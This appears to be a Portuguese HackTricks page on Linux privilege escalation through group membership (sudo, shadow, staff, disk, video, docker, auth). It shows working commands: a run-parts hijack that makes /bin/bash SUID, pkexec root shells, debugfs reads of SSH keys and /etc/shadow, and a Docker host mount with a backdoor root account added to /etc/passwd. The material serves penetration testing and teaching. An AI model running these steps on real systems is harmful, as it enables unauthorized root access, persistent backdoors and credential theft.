# Grupos Interessantes - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Grupos Sudo/Admin

### **PE - Método 1**

**Às vezes**, a política **/etc/sudoers** de um sistema (ou um arquivo incluído nela) contém entradas como:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Isso significa que qualquer usuário correspondente a uma das entradas pode executar qualquer comando como qualquer usuário de destino por meio do sudo (sujeito ao restante da política).<sup>[[3]](#references)</sup>

Se esse for o caso, para **se tornar root, basta executar**:

```
sudo su
```

Se `sudo -l` permitir uma invocação restrita de `adduser` usando apenas um nome de usuário, verifique se ela cria um grupo primário com o mesmo nome, caso ele ainda não exista. Uma nova conta nesse grupo pode obter privilégios se a política sudoers efetiva já os conceder a `%group`; verifique tanto o comportamento de criação do grupo quanto a regra do grupo antes de considerar isso um caminho de escalada. Criar uma conta altera o sistema, então inspecione a política primeiro.

### PE - Method 2

Encontre todos os binários suid e verifique se há o binário **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Se **pkexec for um binário SUID**, ele só poderá executar um programa como outro usuário quando o polkit autorizar a ação solicitada; o bit SUID, por si só, não garante acesso root. Verifique a política instalada e a autorização da sessão de destino, em vez de presumir que ser membro de **sudo** ou **admin** é suficiente.<sup>[[4]](#references)[[5]](#references)</sup>

Para o caminho separado [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), primeiro confirme que `pkexec` é um arquivo executável **SUID pertencente ao root**. Um binário instalado sem esse bit não corresponde à escalada local de privilégios SUID descrita no comunicado. Uma versão upstream é apenas uma pista: as distribuições podem [aplicar o fix retroativamente em versões mais antigas do pacote](https://ubuntu.com/security/CVE-2021-4034); portanto, verifique o pacote do fornecedor instalado e as mitigações antes de considerá-lo vulnerável.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) é um caminho diferente do polkit: uma condição de corrida na autorização do D-Bus, não uma falha SUID do `pkexec`. Verifique o pacote polkit do fornecedor instalado e se uma ação privilegiada acessível via D-Bus pode realizar uma alteração útil; uma via de criação de contas também exige um serviço adequado, como o AccountsService, e o acesso sudo de qualquer novo grupo depende da política sudo efetiva. Uma versão reportada do polkit ou a presença de um serviço instalado, por si só, apenas indicam um possível alvo, especialmente quando os fornecedores [aplicam fixes retroativamente](https://access.redhat.com/security/cve/cve-2021-3560). A enumeração passiva não deve acionar a condição de corrida.

Em distribuições que ainda usam o backend Local Authority antigo, inspecione as regras de grupo com:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Os nomes dos grupos relevantes e os padrões variam conforme a distribuição; um grupo só é útil aqui se a política local o mencionar.<sup>[[5]](#references)</sup>

Para **se tornar root, você pode executar**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Se você tentar executar **pkexec** e receber este **erro**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

Em uma sessão SSH sem um agente de autenticação registrado, `pkexec` pode falhar com esse erro mesmo quando a política permitiria a ação; o polkit documenta `pkttyagent` como um agente de autenticação em texto para sessões que não sejam de desktop. O comportamento exato depende da versão e da distribuição; portanto, verifique a política local e a configuração do agente. Uma solução alternativa relatada para versões afetadas do NixOS usa **2 sessões SSH diferentes**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Uma ACL que nega a uma conta acesso a `su` se aplica a esse executável, não a todas as formas de realizar uma ação autorizada por um administrador. Se uma credencial de administrador for exposta de forma independente, verifique se uma ação separada, como iniciar um serviço transitório por meio de `systemd-run`, é permitida pela política efetiva do polkit, qual identidade o agente de autenticação aceita e qual identidade o serviço resultante usaria. [O polkit distingue a autenticação como proprietário da sessão da autenticação como administrador](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), enquanto [systemd-run pode solicitar um serviço transitório ao gerenciador do sistema](https://systemd.io/CONTROL_GROUP_INTERFACE/). Uma entrada no histórico, um comando instalado ou um arquivo de política legível, por si só, não comprova autorização nem validade da credencial; uma análise passiva não deve enviar credenciais nem iniciar uma unidade.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Grupo wheel

Às vezes, uma política sudoers também pode conter esta entrada:

```
%wheel	ALL=(ALL:ALL) ALL
```

Isso significa que qualquer usuário correspondente à entrada pode executar qualquer comando como qualquer usuário de destino por meio de sudo (sujeito ao restante da política).<sup>[[3]](#references)</sup>

Se esse for o caso, para **se tornar root, basta executar**:

```
sudo su
```

## Grupo shadow

Em sistemas cujas permissões concedem esse acesso, usuários do grupo **shadow** podem **ler** **/etc/shadow**; verifique as permissões e ACLs efetivas no alvo:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Então, leia o arquivo e tente **crackear alguns hashes**.

Uma observação sobre o estado de bloqueio ao analisar hashes:
- Entradas com `!` ou `*` geralmente não permitem login interativo com senha.
- `!hash` significa que a senha foi bloqueada; os caracteres restantes representam o campo da senha antes do bloqueio.
- Um campo contendo `*` não é um hash `crypt(3)` válido e impede o login UNIX com senha; não deduza a partir dele se uma senha foi definida anteriormente.
Isso é útil para classificar contas mesmo quando o login direto está bloqueado.<sup>[[6]](#references)</sup>

## Grupo staff

**staff**: Permite que usuários adicionem modificações locais ao sistema (`/usr/local`) sem precisar de privilégios de root (observe que os executáveis em `/usr/local/bin` estão na variável PATH de qualquer usuário e podem "substituir" os executáveis em `/bin` e `/usr/bin` com o mesmo nome). Compare com o grupo "adm", que está mais relacionado a monitoramento/segurança.<sup>[[2]](#references)[[7]](#references)</sup>

Em configurações Debian nas quais `/usr/local/bin` precede `/usr/bin` em `PATH` (como nos exemplos abaixo), um comando sem caminho explícito resolve primeiro para a cópia em `/usr/local/bin`; confirme o `PATH` efetivo no alvo.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Se um processo privilegiado resolver um comando sem caminho explícito por meio de um `/usr/local/bin` gravável, substituir esse comando pode executá-lo com os privilégios do processo; confirme o caminho real e o gatilho antes de testar.

Em sistemas Ubuntu, `pam_motd` executa scripts executáveis por meio de `run-parts --lsbsysinit` como root no início da sessão; tarefas cron também podem usar `run-parts`, mas isso depende da distribuição e da configuração.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Em um novo login SSH, `pspy` pode ajudar a confirmar se esse caminho é realmente invocado no alvo; ele pode observar as linhas de comando dos processos sem root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Grupo disk

A participação no grupo **disk** pode conceder acesso direto a dispositivos de bloco e costuma ser **quase equivalente ao acesso root**; o Debian descreve esse acesso como praticamente equivalente ao root, mas verifique as permissões reais dos dispositivos e a configuração do armazenamento no alvo.<sup>[[7]](#references)</sup>

Os caminhos comuns de dispositivos incluem `/dev/sd*`, mas NVMe e outras configurações de armazenamento usam nomes diferentes.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` opera em sistemas de arquivos ext2/ext3/ext4; caminhos como `/root` e `/etc/shadow` acima são arquivos dentro do sistema de arquivos aberto, enquanto o segundo argumento de `dump` é um caminho de saída no sistema de arquivos nativo.<sup>[[8]](#references)</sup> Por exemplo, isso extrai `/tmp/asd1.txt` do sistema de arquivos aberto para `/tmp/asd2.txt` no sistema de arquivos nativo:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

A opção `-w` abre o sistema de arquivos para leitura e escrita, e o comando `write` copia um arquivo nativo para o sistema de arquivos aberto. Evite usá-lo em um sistema de arquivos montado e ativo, pois edições diretas podem corromper o sistema de arquivos; sempre que possível, trabalhe a partir de uma imagem offline.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Grupo video

Usando o comando `w`, você pode descobrir **quem está conectado ao sistema**, e ele exibirá uma saída como a seguinte.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

A entrada **tty1** identifica o primeiro console virtual do Linux; por si só, não comprova que haja um usuário fisicamente presente na máquina, especialmente em contêineres ou outros ambientes.<sup>[[21]](#references)</sup>

Em sistemas que expõem um dispositivo framebuffer legível, pertencer ao grupo **video** pode conceder acesso a esse dispositivo. A interface framebuffer do Linux documenta `/dev/fb0` como um dispositivo de memória legível que pode ser copiado para obter uma captura de tela; o caminho `/sys/class/graphics/fb0/virtual_size` só está disponível quando esse atributo sysfs do fbdev está presente, portanto, verifique primeiro o alvo.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Se a versão instalada do **GIMP** disponibilizar um importador de dados brutos, abra **`screen.raw`** com esse importador; o suporte e os controles variam conforme a versão e o plug-in.<sup>[[22]](#references)</sup>

![Grupo Disk - Grupo Video: Para abrir a imagem bruta, você pode usar o GIMP, selecionar o arquivo screen.raw e selecionar Raw image data como tipo de arquivo](<../../../images/image (463).png>)

Defina a largura e a altura da imagem para corresponder à geometria do framebuffer; experimente os formatos de pixel/Tipos de imagem disponíveis até que a saída fique legível.<sup>[[9]](#references)</sup>

![Grupo Disk - Grupo Video: Em seguida, altere a largura e a altura para os valores usados na tela e teste diferentes Tipos de imagem (e selecione o que exibir melhor a tela)](<../../../images/image (317).png>)

## Grupo root

Fazer parte do grupo **root** não fornece o UID de root, mas arquivos graváveis pelo grupo e pertencentes a `root` ainda podem ser interessantes quando serviços ou bibliotecas privilegiados os utilizam. Verifique as permissões reais do arquivo e como ele é usado antes de considerá-lo um caminho para escalonamento de privilégios.

**Verifique quais arquivos os membros do grupo root podem modificar**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

A associação ao grupo `docker` concede acesso de nível root ao daemon do Docker em instalações padrão rootful. Como os bind mounts são de leitura e escrita por padrão, um usuário que pode controlar esse daemon pode montar o `/` do host em um container e alterar arquivos do host; isso efetivamente concede root no host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

A associação ao grupo pode estar dessincronizada entre `/etc/group`, `/etc/gshadow` e o token do processo atual. Se um usuário não aparecer em `id -nG`, mas `newgrp docker` funcionar, verifique o grupo exibido por `id` no novo shell e teste se o socket do Docker realmente permite escrita e atende a um daemon rootful. O nome do grupo, por si só, não comprova controle do host. Limite qualquer probe automatizada com `newgrp` para que um prompt de senha não interrompa a enumeração.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Por fim, se você não gostar de nenhuma das sugestões anteriores ou elas não estiverem funcionando por algum motivo (firewall da API do Docker?), você sempre pode tentar **executar um container privilegiado e escapar dele**, como explicado aqui:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Se você tiver permissões de escrita no socket do Docker, leia [**esta publicação sobre como escalar privilégios abusando do socket do Docker**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Grupo lxc/lxd

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Grupo Adm

Normalmente, **membros** do grupo **`adm`** têm permissão para **ler arquivos de log** localizados em _/var/log/_.\
Portanto, se você comprometeu um usuário desse grupo, definitivamente deve **verificar os logs**.<sup>[[7]](#references)</sup>

## Grupos Backup / Operator / lp / Mail

Esses grupos têm significados específicos para cada serviço e distribuição. O Debian documenta `backup` para delegação de backup/restauração, `lp` para daemons de impressora e `mail` para `/var/mail`; portanto, verifique as permissões locais antes de considerar a associação a esses grupos um caminho para escalar privilégios.<sup>[[7]](#references)</sup>

Eles costumam ser vetores de **descoberta de credenciais**, em vez de caminhos diretos para root:
- **backup**: pode expor arquivos de backup com configurações, chaves, dumps de DB ou tokens.
- **operator**: acesso operacional específico da plataforma que pode vazar dados confidenciais de runtime.
- **lp**: filas de impressão/spools podem conter o conteúdo de documentos.
- **mail**: spools de e-mail podem expor links de redefinição, OTPs e credenciais internas.

Considere a associação a esses grupos uma descoberta de exposição de dados de alto valor e explore a reutilização de senhas/tokens.

## Grupo Auth

No OpenBSD, quando o S/Key está configurado, `/etc/skey` pertence a `root:auth`, e o acesso aos registros exige o grupo `auth`; os registros do YubiKey são armazenados em `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Uma configuração vulnerável do OpenBSD 6.6 com S/Key ou YubiKey habilitado permitia que usuários locais com privilégios `auth` se tornassem root; a Qualys documenta os pré-requisitos e a cadeia de exploração, e o PoC vinculado implementa essa técnica.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Autenticação de pkexec/pkttyagent sem uma sessão GUI (issue #18012 do NixOS)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Grupos do sistema - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — páginas de manual do Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Manual de referência do polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Manual de referência do polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — página de manual do Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Manual de segurança do Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — página de manual do Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [O dispositivo Frame Buffer — documentação do kernel Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — páginas de manual do Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — páginas de manual do Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — monitoramento de processos Linux sem privilégios](https://github.com/DominicBreuker/pspy)
- [13] [Segurança do Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Gerenciar o Docker como usuário não root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Executar containers — documentação do Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — páginas de manual do OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — páginas de manual do OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Vulnerabilidades de autenticação no OpenBSD — comunicado de segurança da Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC de exploit local](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — página de manual do Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Dispositivos alocados do Linux (versão 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Importação e exportação de imagens — documentação do GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
